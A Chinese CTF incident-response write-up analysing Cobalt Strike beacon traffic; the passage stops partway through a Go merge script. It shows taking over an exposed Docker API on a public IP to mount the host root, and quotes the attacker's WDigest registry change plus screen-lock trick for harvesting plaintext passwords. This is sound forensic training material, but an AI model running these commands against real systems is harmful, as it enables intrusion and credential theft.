---
created: 2026-02-05
modified: 2026-02-05
tags:
  - CTF/应急响应
---

```table-of-contents
title: 
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 0 # Include headings up to the specified level
include: 
exclude: 
includeLinks: true # Make headings clickable
hideWhenEmpty: false # Hide TOC if no headings are found
debugInConsole: false # Print debug info in Obsidian console
```

# 概述

> [!info]
> 某单位安全运维人员在夜间捕获了一个数据包和一个恶意 IP，请你分析数据包结合 IP 回答相应问题

# 步骤

## 1 步骤一 - 溯源反制

> [!info]
> 1. 溯源反制，提交黑客 CS 服务器的 flag.txt 内容

用 `nmap` 扫描，会扫到所有端口都开放了；如果上 `-sV` 或直接 `-A`，那会阻塞很长时间都扫不出来。

![[CobaltStrike流量分析-260205-210617.png]]

![[CobaltStrike流量分析-260205-210729.png]]

![[CobaltStrike流量分析-260205-210816.png]]

很明显目标有防火墙，会对所有端口的探测返回 `syn-ack`；用 `-sA` 探测一下，会发现所有端口都返回 `reset`，说明目标不是有状态防火墙。

![[CobaltStrike流量分析-260205-211021.png]]

这时候用 `nmap` 扫描肯定是不行了；然后看了下 `wp` 用的是 `fscan` 扫描，并且直接扫描出漏洞了；我们就照着复现一下。

一开始我直接用 `git clone --depth=1` 拉取源码编译出了 `2.0.1` 版本的 `fscan` 来着，结果这个版本居然扫不到漏洞，只能扫到有漏洞的那个端口

![[CobaltStrike流量分析-260205-214158.png]]

再用 `nmap -sV -p2375` 具体扫描一下，是能判断出这个端口跑了一个 `docker` 引擎的

![[CobaltStrike流量分析-260205-212544.png]]

访问 `http://43.192.52.73:2375/version` 也是正常返回版本信息的；`fscan` 应该也是根据这个 `http` 服务发现这个端口的。

![[CobaltStrike流量分析-260205-214311.png]]

```docker-version
{
  "Platform": {
    "Name": ""
  },
  "Components": [
    {
      "Name": "Engine",
      "Version": "20.10.5+dfsg1",
      "Details": {
        "ApiVersion": "1.41",
        "Arch": "amd64",
        "BuildTime": "2022-05-30T18:34:49.000000000+00:00",
        "Experimental": "false",
        "GitCommit": "363e9a8",
        "GoVersion": "go1.15.15",
        "KernelVersion": "4.19.0-25-amd64",
        "MinAPIVersion": "1.12",
        "Os": "linux"
      }
    },
    {
      "Name": "containerd",
      "Version": "1.4.13~ds1",
      "Details": {
        "GitCommit": "1.4.13~ds1-1~deb11u4"
      }
    },
    {
      "Name": "runc",
      "Version": "1.0.0~rc93+ds1",
      "Details": {
        "GitCommit": "1.0.0~rc93+ds1-5+deb11u5"
      }
    },
    {
      "Name": "docker-init",
      "Version": "0.19.0",
      "Details": {
        "GitCommit": ""
      }
    }
  ],
  "Version": "20.10.5+dfsg1",
  "ApiVersion": "1.41",
  "MinAPIVersion": "1.12",
  "GitCommit": "363e9a8",
  "GoVersion": "go1.15.15",
  "Os": "linux",
  "Arch": "amd64",
  "KernelVersion": "4.19.0-25-amd64",
  "BuildTime": "2022-05-30T18:34:49.000000000+00:00"
}
```

后来通过：

```bash
git fetch origin tag 1.8.4 --no-tags
git checkout 1.8.4
git switch -c v1.8.4
go build -ldflags="-s -w" -trimpath .
```

拉取 `1.8.4` 版本的 `fscan` 并编译后，扫描，成功扫描到漏洞；简单来说是 `dockerd` 后端的 `api` 直接暴露在公网了且没有配置身份认证机制，导致我们可以直接 `docker -H tcp://addr:2375 -it -v /:/<任意目录> <任意已有镜像> /bin/bash` 达到在目标上开启一个映射了目标根目录的容器，并且能登录到容器的 `shell` 中。

![[CobaltStrike流量分析-260205-214808.png]]

我们用 `dockdr -H tcp://host:2375 ps` 验证一下，提示我们 `api` 版本过高，最高只能是 `1.41`

![[CobaltStrike流量分析-260205-215156.png]]

我们用 `docker version` 查看一下 `api version`，发现是 `1.52`

![[CobaltStrike流量分析-260205-220155.png]]

#知识/docker/docker_api_version

用下面的命令先改一下 `DOCKER_API_VERSION` 环境变量为 `1.41`

```bash
export DOCKER_API_VERSION=1.41
```

再执行 `docker version` 命令，就会发现 `api` 版本成功改过来了。

![[CobaltStrike流量分析-260205-222305.png]]

然后我们用 `docker -H tcp://host:2375 images` 来看一下目标上有哪些镜像，这里只有一个 `nginx`

![[CobaltStrike流量分析-260205-221803.png]]

用 `docker -H tcp://host:2375 run -it -v /:/T nginx /bin/bash` 将目标的 `/` 目录映射到容器的 `/T` 目录，并进入容器的交互式 `shell`；然后 `cat /T/root/flag.txt`

![[CobaltStrike流量分析-260206-175434.png]]

```flag1
flag{6750ac374fdc3038a67e95e1f21d455c}
```

## 2 步骤二 - 攻击机上线时间

> [!info]
> 2. 黑客攻击主机上线时间是？(flag{YYYY-MM-DD HH:MM:SS})

看统计的 `http` 流量设计的 `ip` 会发现，`192.168.31.92` 和 `192.168.31.170` 这两个出现的最多；去看具体的 `http` 流量会发现，，从「92」到「170」的流量为请求包，并且有明显的 `checksum8` 特征 (`/FJwV`) 和 `/submit.php?id=` 特征以及 `/en_US/all.js` 伪装特征；因此判断攻击机为 `192.168.31.170` 这个 `ip`。

![[CobaltStrike流量分析-260205-223705.png]]

去看一下它的第一个响应的时间即为上线时间。

![[CobaltStrike流量分析-260205-223910.png]]

```flag2
flag{2025-02-12 20:12:52}
```

## 3 步骤三 - payload 名字

> [!info]
> 3. 黑客使用的隧道 payload 名字是什么？

一般来说，被成功植入木马的目标向部署有 `TeamServer` 的攻击机发送的第一个请求是由 `Stager` 发出的，它的作用是作为一个轻量的「加载器」去向 `TeamServer` 下载 `Beacon` 并加载其到被攻击机的内存中；后续再由 `Beacon` 与 `TeamServer` 交互；

这题问的 `payload` 名字其实就是从 `TeamServer` 响应的 `Beacon` 的 `payload type`；所以我们先把 `/FJwV` 的响应数据导出到文件中

![[CobaltStrike流量分析-260206-110729.png]]

然后用下面这个地址的脚本去从 `payload` 中解析出 `Beacon` 的信息

> [!cite] 
> https://github.com/DidierStevens/DidierStevensSuite/blob/master/1768.py

```pwsh
python .\1768.py .\FJwV
```

```res
File: .\FJwV
xorkey(chain): 0x1f6828ff
length: 0x040e00ad
xorkey b'.' 2e
0x0001 payload type                     0x0001 0x0002 0 windows-beacon_http-reverse_http
0x0002 port                             0x0001 0x0002 80
0x0003 sleeptime                        0x0002 0x0004 60000
0x0004 maxgetsize                       0x0002 0x0004 1048576
0x0005 jitter                           0x0001 0x0002 0
0x0007 publickey                        0x0003 0x0100 30819f300d06092a864886f70d010101050003818d003081890281810093b4127271907b80352c6a15b6bb1701bd01657a2fba3ca1fba56d9a13e9f1f3121ac3aa70248f8621217fddfc0a484e78ebf4e5b48bb4804eababe5366cf4886b6ce2a5a113edd851fc5b2fb62a925043354000bbae7f2f75d7b0b7097a17b7c7de195174d4b17cee1499ae1e52e3ce3eec3f70011d971d022c0a8723def11d020301000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
0x0008 server,get-uri                   0x0003 0x0100 '192.168.31.170,/en_US/all.js'
0x0043 DNS_STRATEGY                     0x0001 0x0002 0
0x0044 DNS_STRATEGY_ROTATE_SECONDS      0x0002 0x0004 -1
0x0045 DNS_STRATEGY_FAIL_X              0x0002 0x0004 -1
0x0046 DNS_STRATEGY_FAIL_SECONDS        0x0002 0x0004 -1
0x000e SpawnTo                          0x0003 0x0010 (NULL ...)
0x001d spawnto_x86                      0x0003 0x0040 '%windir%\\syswow64\\rundll32.exe'
0x001e spawnto_x64                      0x0003 0x0040 '%windir%\\sysnative\\rundll32.exe'
0x001f CryptoScheme                     0x0001 0x0002 0
0x001a get-verb                         0x0003 0x0010 'GET'
0x001b post-verb                        0x0003 0x0010 'POST'
0x001c HttpPostChunk                    0x0002 0x0004 0
0x0025 license-id                       0x0002 0x0004 666666
0x0024 deprecated                       0x0003 0x0020 'MYhXSMGVvcr7PtOTMdABvA=='
0x0026 bStageCleanup                    0x0001 0x0002 0
0x0027 bCFGCaution                      0x0001 0x0002 0
0x0047 MAX_RETRY_STRATEGY_ATTEMPTS      0x0002 0x0004 0
0x0048 MAX_RETRY_STRATEGY_INCREASE      0x0002 0x0004 0
0x0049 MAX_RETRY_STRATEGY_DURATION      0x0002 0x0004 0
0x0009 useragent                        0x0003 0x0100 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; MASP)'
0x000a post-uri                         0x0003 0x0040 '/submit.php'
0x000b Malleable_C2_Instructions        0x0003 0x0100
  Transform Input: [7:Input,4]
   Print
0x000c http_get_header                  0x0003 0x0200
  Build Metadata: [7:Metadata,3,6:Cookie]
   BASE64
   Header Cookie
0x000d http_post_header                 0x0003 0x0200
  Const_header Content-Type: application/octet-stream
  Build SessionId: [7:SessionId,5:id]
   Parameter id
  Build Output: [7:Output,4]
   Print
0x0036 HostHeader                       0x0003 0x0080 (NULL ...)
0x0032 UsesCookies                      0x0001 0x0002 1
0x0023 proxy_type                       0x0001 0x0002 2 IE settings
0x003a TCP_FRAME_HEADER                 0x0003 0x0080 '\x00\x04'
0x0039 SMB_FRAME_HEADER                 0x0003 0x0080 '\x00\x04'
0x0037 EXIT_FUNK                        0x0001 0x0002 0
0x0028 killdate                         0x0002 0x0004 0
0x0029 textSectionEnd                   0x0002 0x0004 0
0x002b process-inject-start-rwx         0x0001 0x0002 64 PAGE_EXECUTE_READWRITE
0x002c process-inject-use-rwx           0x0001 0x0002 64 PAGE_EXECUTE_READWRITE
0x002d process-inject-min_alloc         0x0002 0x0004 0
0x002e process-inject-transform-x86     0x0003 0x0100 (NULL ...)
0x002f process-inject-transform-x64     0x0003 0x0100 (NULL ...)
0x0035 process-inject-stub              0x0003 0x0010 '\x04à¡\x1bå\x91G¨×=+>\x9fê\x83,'
0x0033 process-inject-execute           0x0003 0x0080 '\x01\x02\x03\x04'
0x0034 process-inject-allocation-method 0x0001 0x0002 0
0x0000
Guessing Cobalt Strike version: 4.4 (max 0x0049)
Sanity check Cobalt Strike config: OK
Sleep mask 64-bit 4.2 deobfuscation routine found: 0x00010176 (LSFIF: b'tYE3')
Sleep mask 64-bit 4.2 deobfuscation routine found: 0x0001030e (LSFIF: b'tYE3')
Public key config entry found: 0x0003b65d (xorKey 0x2e) (LSFIF: b'././.,...,./.,.~.-.,.*..')
Public key header found: 0x0003b663 (xorKey 0x2e) (LSFIF: b'N.*.,.*.>...+./.,...).-/.')
```

然后会找到 `payload type` 为 `windows-beacon_http-reverse_http`

![[CobaltStrike流量分析-260206-110927.png]]

```flag3
flag{windows-beacon_http-reverse_http}
```

## 4 步骤四 - 明文密码

> [!info]
> 4. 黑客获取到当前用户的明文密码是什么？

这里得到「黑客获取到的用户的明文密码」，收集到两种方法

### 4.1 方法一：溯源日志

这种方法是从 [这个 wp](https://www.cnblogs.com/blue-red/p/19022396) 看来的，思路是既然前面已经成功溯源反制了部署有 `TeamServer` 的攻击机，那么我们就可以在攻击机上找一下 `cs` 的日志，看看日志中有没有「获取到当前用户的明文密码」；

关于 `CobaltStrike` 日志的结构，可以看我整理的 [[CobaltStrike流量分析总结#6 TeamServer 的日志结构 (以某 4.5 版本为例)]]

我们找到 `CobaltStrike` 的文件夹

![[CobaltStrike流量分析-260206-180636.png]]

然后在它的 `logs/` 目录中搜索 `Password` 字样，并且排除掉有 `null` 的行；

```bash
root@7450956e4469:/T/opt/Cobalt_Strike_4.5/Cobalt_Strike_4.5/logs #\
> grep -r "Password" . | grep -v "null"
```

之所以要排除有 `null` 的行，是因为不排除的话，会得到很多 `Password : (null)` 的结果 (为什么会有 `null` 之后会知道)。

![[CobaltStrike流量分析-260206-213625.png]]

![[CobaltStrike流量分析-260206-213235.png]]

```flag4
flag{xj@cs123}
```

从结果上看，去看一下找到密码的日志，截图如下；会发现是用 `mimikatz's sekurlsa::logonpasswords` 来获取目标用户明文密码的。

![[CobaltStrike流量分析-260207-163145.png]]

其实按照日期来看，应该是下面这个 `2` 月 `12` 日的日志，因为流量包是在 `12` 日这天抓的；而前面的那张截图的日志是 `2` 月 `10` 日的，应该是作者测试时留下来的日志。

![[CobaltStrike流量分析-260207-201449.png]]

### 4.2 方法二：解析流量

#### 4.2.1 获取 rsa 私钥

##### 方法一：从 `.cobaltstrike.beacon_keys` 提取私钥

我们从溯源的攻击机上读取出 `.cobaltstrike.beacon_keys` 文件，这个文件其实就是 `java` 反序列化的数据，保存了 `rsa` 公私钥等信息。

![[CobaltStrike流量分析-260206-180651.png]]

为了方便提取，我们用 `base64` 输出出来，然后复制一下

![[CobaltStrike流量分析-260206-180857.png]]

把下面这个提取脚本改一下，使得其把 `base64` 字符串解析为文件并用 `javaobj` 库解析反序列化数据，然后读取公私钥，最后输出私钥的 16 进制值。

> [!cite]
> https://github.com/Slzdude/cs-scripts/blob/master/parse_beacon_keys.py

```python
import base64
import io
import javaobj.v2 as javaobj

b64 = '''rO0ABXNyABRzbGVlcC5ydW50aW1lLlNjYWxhcryvNaxLcOBGAwADTAAFYXJyYXl0ABtMc2xlZXAv
cnVudGltZS9TY2FsYXJBcnJheTtMAARoYXNodAAaTHNsZWVwL3J1bnRpbWUvU2NhbGFySGFzaDtM
AAV2YWx1ZXQAGkxzbGVlcC9ydW50aW1lL1NjYWxhclR5cGU7eHBzcgAec2xlZXAuZW5naW5lLnR5
cGVzLk9iamVjdFZhbHVluXko22Ba54kCAAFMAAV2YWx1ZXQAEkxqYXZhL2xhbmcvT2JqZWN0O3hw
c3IAFWphdmEuc2VjdXJpdHkuS2V5UGFpcpcDDDrSzRKTAgACTAAKcHJpdmF0ZUtleXQAGkxqYXZh
L3NlY3VyaXR5L1ByaXZhdGVLZXk7TAAJcHVibGljS2V5dAAZTGphdmEvc2VjdXJpdHkvUHVibGlj
S2V5O3hwc3IAFGphdmEuc2VjdXJpdHkuS2V5UmVwvflPs4iapUMCAARMAAlhbGdvcml0aG10ABJM
amF2YS9sYW5nL1N0cmluZztbAAdlbmNvZGVkdAACW0JMAAZmb3JtYXRxAH4ADUwABHR5cGV0ABtM
amF2YS9zZWN1cml0eS9LZXlSZXAkVHlwZTt4cHQAA1JTQXVyAAJbQqzzF/gGCFTgAgAAeHAAAAJ6
MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAJO0EnJxkHuANSxqFba7FwG9AWV6
L7o8ofulbZoT6fHzEhrDqnAkj4YhIX/d/ApITnjr9OW0i7SATqur5TZs9IhrbOKloRPt2FH8Wy+2
KpJQQzVAALuufy9117C3CXoXt8feGVF01LF87hSZrh5S484+7D9wAR2XHQIsCocj3vEdAgMBAAEC
gYBp/uTqGhNcfZIrMGoquzJ0feWdpETR+qcoBvyTgMz3Y79PU7FhTutsjyQSNgSkgGVII9SYb6t+
OkG6st4H48LLbsOm3sSo6KIoILuwIKPP4weXi8EdeFUeb8adwFgXC2XPs9Q0gnv148UDDNVf6UqO
S/ytp3rebDMCQXUJsuOSJQJBAPzIJvVfLlweOqNScH3/iUrkk/rFFXAlC/K4B0PkHsZuoI2B9/aM
VyGDdk4nUGzswLVizA8bfgqdoJ0vRyV12o8CQQCVlXS+qEOAUxiOiVwtosRP5UUw6lIv2+rMxSeX
VVNfitYanH88/n3sr4UDGizlKZAQC18TDlxeRXwKzWgyov+TAkAM+KxfHQJBAeAab2mMXaeK603Y
qXJfLdd+HglpZ3RY1GZyvH+f7DWwZ5GTkxribAe7hxVXlR6TpuEOD9YDyxdrAkAbDlN1gN3kwiL4
9SN1JbG4edHQDTIccfzAWRDWMJrJ90TOv2vMToPcYcr/SqbANIpYPJZPzhMrAgpzsb+dGRp9AkEA
zWFEOBKqLnfIZR4g6AtuIugScM67nU3Kpo6P9jFZsnLrMjhc6RvyfKWrnQkpeNx8GGagTrOKlTXe
XxcjlSvp0nQABlBLQ1MjOH5yABlqYXZhLnNlY3VyaXR5LktleVJlcCRUeXBlAAAAAAAAAAASAAB4
cgAOamF2YS5sYW5nLkVudW0AAAAAAAAAABIAAHhwdAAHUFJJVkFURXNxAH4ADHEAfgARdXEAfgAS
AAAAojCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAk7QScnGQe4A1LGoVtrsXAb0BZXovujyh
+6VtmhPp8fMSGsOqcCSPhiEhf938CkhOeOv05bSLtIBOq6vlNmz0iGts4qWhE+3YUfxbL7YqklBD
NUAAu65/L3XXsLcJehe3x94ZUXTUsXzuFJmuHlLjzj7sP3ABHZcdAiwKhyPe8R0CAwEAAXQABVgu
NTA5fnEAfgAVdAAGUFVCTElDcHB4'''.replace("\r", "").replace("\n", "").strip()
ori_data = base64.b64decode(b64)

fd =  io.BytesIO(ori_data)

pobj = javaobj.load(fd)
privateKey = bytes(map(lambda x: x & 0xFF, pobj.array.value.privateKey.encoded.data))
publicKey = bytes(map(lambda x: x & 0xFF, pobj.array.value.publicKey.encoded.data))

print("Private Key:")
print(privateKey.hex())
print("Public Key:")
print(publicKey.hex())
```

```rsa
Private Key:
30820276020100300d06092a864886f70d0101010500048202603082025c0201000281810093b4127271907b80352c6a15b6bb1701bd01657a2fba3ca1fba56d9a13e9f1f3121ac3aa70248f8621217fddfc0a484e78ebf4e5b48bb4804eababe5366cf4886b6ce2a5a113edd851fc5b2fb62a925043354000bbae7f2f75d7b0b7097a17b7c7de195174d4b17cee1499ae1e52e3ce3eec3f70011d971d022c0a8723def11d020301000102818069fee4ea1a135c7d922b306a2abb32747de59da444d1faa72806fc9380ccf763bf4f53b1614eeb6c8f24123604a480654823d4986fab7e3a41bab2de07e3c2cb6ec3a6dec4a8e8a22820bbb020a3cfe307978bc11d78551e6fc69dc058170b65cfb3d434827bf5e3c5030cd55fe94a8e4bfcada77ade6c3302417509b2e39225024100fcc826f55f2e5c1e3aa352707dff894ae493fac51570250bf2b80743e41ec66ea08d81f7f68c572183764e27506cecc0b562cc0f1b7e0a9da09d2f472575da8f024100959574bea8438053188e895c2da2c44fe54530ea522fdbeaccc5279755535f8ad61a9c7f3cfe7decaf85031a2ce52990100b5f130e5c5e457c0acd6832a2ff9302400cf8ac5f1d024101e01a6f698c5da78aeb4dd8a9725f2dd77e1e0969677458d46672bc7f9fec35b0679193931ae26c07bb871557951e93a6e10e0fd603cb176b02401b0e537580dde4c222f8f5237525b1b879d1d00d321c71fcc05910d6309ac9f744cebf6bcc4e83dc61caff4aa6c0348a583c964fce132b020a73b1bf9d191a7d024100cd61443812aa2e77c8651e20e80b6e22e81270cebb9d4dcaa68e8ff63159b272eb32385ce91bf27ca5ab9d092978dc7c1866a04eb38a9535de5f1723952be9d2
Public Key:
30819f300d06092a864886f70d010101050003818d003081890281810093b4127271907b80352c6a15b6bb1701bd01657a2fba3ca1fba56d9a13e9f1f3121ac3aa70248f8621217fddfc0a484e78ebf4e5b48bb4804eababe5366cf4886b6ce2a5a113edd851fc5b2fb62a925043354000bbae7f2f75d7b0b7097a17b7c7de195174d4b17cee1499ae1e52e3ce3eec3f70011d971d022c0a8723def11d0203010001
```

##### 方法二：rsa 分解 n 计算私钥

前面解析 `Beacon` 的配置信息中，我们能看到 `publickey`；

![[CobaltStrike流量分析-260207-164125.png]]

如果没法读到 `.cobaltstrike.beacon_keys` 文件，我们可以尝试从公钥中提取出 `e` 和 `n`，然后对 `n` 进行质因数分解出 `p` 和 `q`，再用 `p` `q` `n` `e` 计算出 `d`，从而得到私钥 `(d, n)`

#### 4.2.2 用私钥解密加密元数据得到 `raw_key`

当 `Stager` 加载完 `Beacon` 后，`Beacon` 向 `TeamServer` 发送的第一个心跳包中会包含使用 `rsa` **公钥加密**的 `metadata`(一般会放在 `Cookie` 中并 `base64` 编码)，里面就包括后续使用 `aes` 加密通信用的密钥；

我们从第一个心跳包的 `Cookie` 头部读取出数据，如下图：

![[CobaltStrike流量分析-260207-172644.png]]

```cookie
IyltNSnpj6lSGi0WGIaJIsFWg6Ko6V+20xExzajz0A3AkRi2MMWjLSZvHltXLFJg5joFEKQ8lQYKh96XCYfDMO3yWWCzyZdpoCLdWRNzR8FN3Z3buww8afGOhKe+NVEWFzTPafNZh3kFlWUf5zk/etCn8WPy4qg4BArMvbx/yqM=
```

然后用下面的脚本去解密，用法是

```bash
python cs-decrypt-metadata.py -p <十六进制私钥> <base64编码后的 rsa 加密元数据>
```

> [!cite]
> https://github.com/DidierStevens/DidierStevensSuite/blob/master/cs-decrypt-metadata.py

![[CobaltStrike流量分析-260207-194043.png]]

```raw_key
Raw key:  a4553adf7a841e1dcf708afc912275ee
aeskey:  a368237121ef51b094068a2e92304d46
hmackey: b6315feb217bd87188d06870dd92855b
```

#### 4.2.3 解密流量包

得到 `raw_key` 后可以用下面的脚本去解密流量包：

> [!cite]
> https://github.com/DidierStevens/DidierStevensSuite/blob/master/cs-parse-traffic.py

使用方法为：

```bash
python .\cs-parse-traffic.py -r <raw_key_hex> -k <aes_key_hex>:<hmac_key_hex> -e -Y "wireshark 的显示过滤器语法(过滤出需要解密的流量包)" -o res.txt  <流量包路径>.pcapng
```

详细用法为 (翻译后):

```text
用法: cs-parse-traffic-gb2312.py [选项] [[@]文件 ...]
分析 Cobalt Strike HTTP/DNS 信标流量

参数:
@file   处理指定文本文件中列出的每个文件
        支持通配符

源代码由 Didier Stevens 置于公共领域，无版权
自行承担风险使用
https://DidierStevens.com

选项:
  --version             显示程序版本号并退出
  -h, --help            显示此帮助消息并退出
  -m, --man             打印手册
  -o OUTPUT, --output=OUTPUT
                        输出到文件（支持 # 占位符）
  -f FORMAT, --format=FORMAT
                        格式: http/dns/task/callback/callbacksingle 
                        （默认 http）
  -e, --extract         将有效载荷提取到磁盘
  -r RAWKEY, --rawkey=RAWKEY
                        Cobalt Strike 信标的原始密钥
  -k HMACAESKEYS, --hmacaeskeys=HMACAESKEYS
                        HMAC 和 AES 密钥（十六进制，用 : 分隔）
  -Y DISPLAYFILTER, --displayfilter=DISPLAYFILTER
                        Tshark 显示过滤器（默认 http/dns）
  -t TRANSFORM, --transform=TRANSFORM
                        转换指令
  -i DNSIDLE, --dnsidle=DNSIDLE
                        DNS 空闲值
  -b BEACONID, --beaconid=BEACONID
                        信标 ID（十六进制）
  -V, --verbose         详细输出
```

但上面的脚本有两个问题：
1. 遇到 `gb2312` 编码会直接报错
2. 过滤器貌似不起作用，所以如果流浪包中有其他 `http` 流量的话，需要先用 `wireshark` 提取出来带解密的流量再使用脚本

由于脚本实在太长了，看不过来，就让 `ai` 改了改让其支持 `gb2312` 编码 (找到 `wp` 贴了修改过的脚本，不过为了确保不出问题我还是把原版脚本给 `ai` 重新改了一份，这里就不贴了)。

至于显示过滤器的问题，我们可以先用 `wireshark` 过滤出我们想要的分组，然后用「文件 ->导出特定分组...」功能导出新的流量包给脚本解密；

然后 `Beacon` 和 `SteamServer` `HTTP` 通信中，只有 `POST` 请求和响应会被 `aes` 对称加密，所以我们只需要选出这些就行了。

> [!quote] [原文](https://www.cnblogs.com/blue-red/p/19022396)
> 每一个 GET 请求的 Cookie 结合私钥都可以得出 Raw key，默认只有响应包与 POST 请求包是用对称算法加密的，其它的 GET 请求只是心跳包 (POST 是命令执行结果，响应包是指令)。
> (本地尝试解密的情况是解密流量中含有心跳包会报错 Exception: HMAC signature invalid)。

所以我们用 `http && !(http.request.method == GET)` 过滤出符合条件的包

![[CobaltStrike流量分析-260207-221335.png]]

然后解密

```bash
python .\cs-parse-traffic-gb2312.py -r a4553adf7a841e1dcf708afc912275ee -k a368237121ef51b094068a2e92304d46:b6315feb217bd87188d06870dd92855b -e -o res.txt .\cs-spec.pcapng
```

最终在解密的流量中找到明文密码

![[CobaltStrike流量分析-260207-221607.png]]

```flag4
flag{xj@cs123}
```

## 5 步骤五 - 为了获得密码执行的命令

> [!info]
> 5. 黑客为了得到明文密码修改了什么？（提交 flag{md5(执行的命令)}）

### 5.1 方法一：溯源日志

找到之前找到的 `12` 日出现 `Password` 的日志，往上翻，会发现前一次执行 `mimikatz's sekurlsa::logonpasswords` 失败了，输出的 `Password` 全是 `null`；这代表从目标电脑中没有途径能读到内存中的明文密码。

![[CobaltStrike流量分析-260207-203730.png]]

于是，攻击者就执行了下图绿色荧光和樱紫色荧光的地方的命令，让内存中有明文密码，然后再用 `logonpasswords` 读取明文密码，可以看到成功在 `wdigest` 这一栏中看到成功读到的密码。

![[CobaltStrike流量分析-260207-203651.png]]

依次执行的两个命令如下，其中，`reg add` 增加一个注册表项，后面的 `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest` 是 `WDigest` 功能的配置项，`/v UseLogonCredential` 指定操作的键值对的键名为 `UseLogonCredential`、`/t` 指定类型、`/d` 指定键值对的值数据、`/f` 表示强制覆盖；通过这种方法，就开启了 `WDigest` 协议把用户密码明文存储在内存的模式，于是 `Mimikatz` 就能从内存中读取到用户明文密码了。

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

---

#知识/Windows/WDigest 

`Wdiest` 是一种古早的身份验证协议，在 `XP` 附近引入，用于支持 `HTTP Digest` 身份验证；它是一种「挑战认证协议」，流程是这样的：
1. 客户端发送认证请求到服务器
2. 服务器返回一个随机值 `Nonce` 作为挑战
3. 客户端调用 `WDigest` 的功能，使用用户名、密码、Nonce、请求方法和 URL 等信息进行 `MD5` 摘要
4. 把摘要的结果发送给服务器，服务器用相同的方法计算出的摘要如果一样，则验证通过。

而由于 `Wdiest` 是把用户明文密码直接或用可逆加密存储在内存中的，这使得 `Mimikatz` 等工具能直接从内存中获取到用户的明文密码，极不安全；

在 `win 7` 和 `2008 r2` 之前都是默认开启 `Wdigest` 且无法禁用，需要额外安装 `KB2871997` 补丁；而之后的 `windows` 都默认禁止了把明文密码保存在内存的方式，打了补丁或之后的版本想要启用可以修改注册表 `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest` 的 `UseLogonCredential` 键值对为 `1`。

---

至于后面的 `rundll32.exe user32.dll,LockWorkStation` 则是用 `rundll32.exe`(`windows` 自带的程序，用于执行动态链接库中的功能) 去执行动态库 `user32.dll` 中的 `LockWorkStation`(锁屏) 功能；因为修改注册表后，`WDigest` 可能还没将明文密码载入内存，这时把目标屏锁了，当用户输入密码解锁时明文密码就会顺便被 `WDigest` 载入内存。

```cmd
rundll32.exe user32.dll,LockWorkStation
```

因此为了密码而执行的命令是下面这个，`md5` 后就是 `flag`

![[CobaltStrike流量分析-260207-203950.png]]

然后会发现从日志中读到的格式不对，得用解析流量包获得的命令格式 (前面加个 ` /C`，`\` 变 `\\`)

![[CobaltStrike流量分析-260207-204834.png]]

```flag5
flag{73aeb8ee98d124a1f8e87f7965dc0b4a}
```

### 5.2 方法二：解析流量

从解析的流量包中分析也是一样的逻辑，读到 `/C reg .......` 命令，`md5` 后就是 `flag`

![[CobaltStrike流量分析-260207-221833.png]]

```flag5
flag{73aeb8ee98d124a1f8e87f7965dc0b4a}
```

## 6 步骤六 - 下载的文件名

> [!info]
> 6. 黑客下载的文件名称是什么？

### 6.1 方法一：溯源日志

那天是 `2` 月 `12` 日，我们看这天的 `downloads.log`，读到是 `xxx服务器运维信息.xlsx`

![[CobaltStrike流量分析-260207-222636.png]]

### 6.2 方法二：解析流量

继续往后读解析出的流量，显示执行了 `COMMAND_LS` 列一下文件

![[CobaltStrike流量分析-260207-222142.png]]

然后执行 `COMMAND_DOWNLOAD` 下面文件，文件名我们很容易能看到是 `xxx服务器运维信息.xlsx`

![[CobaltStrike流量分析-260207-222259.png]]

```flag6
flag{xxx服务器运维信息.xlsx}
```

## 7 步骤七 - 下载的文件内容

> [!info]
> 7. 黑客下载的文件内容是什么？

### 7.1 方法一：溯源日志

之前的日志中记录了下载的文件的保存位置为 `/opt/Cobalt_Strike_4.5/Cobalt_Strike_4.5/downloads/16b48285a`，因此去读取一下就行了。

![[CobaltStrike流量分析-260207-225325.png]]

![[CobaltStrike流量分析-260207-225542.png]]

![[CobaltStrike流量分析-260207-225603.png]]

### 7.2 方法二：解析流量

根据解析结果里的 `md5` 值去找到有效载荷，改个后缀

![[CobaltStrike流量分析-260207-225901.png]]

然后就能直接打开，读到 `flag` 了

![[CobaltStrike流量分析-260207-225956.png]]

```flag7
flag{752fe2f44306e782f0d6830faad59e0e}
```

## 8 步骤八 - 上传的文件内容

> [!info]
> 8. 黑客上传的文件内容是什么？

### 8.1 溯源日志读不到具体文件

在日志中找到了上传的文件名，但貌似读不到具体文件？因为下面前面的那个路径是文件在操作员设备上的位置，而 `TeamServer` 上在哪保存暂时没找到

![[CobaltStrike流量分析-260207-230558.png]]

### 8.2 解析流量

从解析的流量看，上传文件分 `7` 次完成，把下面两种图所示的七个 `md5` 对应的文件合并即可

![[CobaltStrike流量分析-260207-231540.png]]

![[CobaltStrike流量分析-260207-231704.png]]

提取出文件 `md5` 的顺序

```md5
c3b95df4307fc99783902046a44c5d11
d4863d91eb3b4f9589c72fa6f512cc14
308acb7dad1be9f4536f0592e07a2795
faa7604d4648c0eaba56c49fe126a80d
06666fffd233f1ab7a642e06b6fe5928
b163a6b1d558fa5653b2c70084c20cd7
8bbebe9b0f2670cd5a5aa540a9a704b9
```

另外每个文件开的的路径信息需要去掉

![[CobaltStrike流量分析-260207-235242.png]]

于是就有合并脚本如下：

```go
package main

import (
	"bytes"
	"iter"
	"os"
)

func filenameGen() iter.Seq[string] {
	return func(yield func(string) bool) {
		for _, md5 := range []string{
			"c3b95df4307fc99783902046a44c5d11",
			"d4863d91eb3b4f9589c72fa6f512cc14",
			"308acb7dad1be9f4536f0592e07a2795",
			"faa7604d4648c0eaba56c49fe126a80d",
			"06666fffd233f1ab7a642e06b6fe5928",
			"b163a6b1d558fa5653b2c70084c20cd7",
			"8bbebe9b0f2670cd5a5aa540a9a704b9",
		} {
			if !yield("payload-" + md5 + ".vir") {
				return
			}
		}
	}
}

func main() {
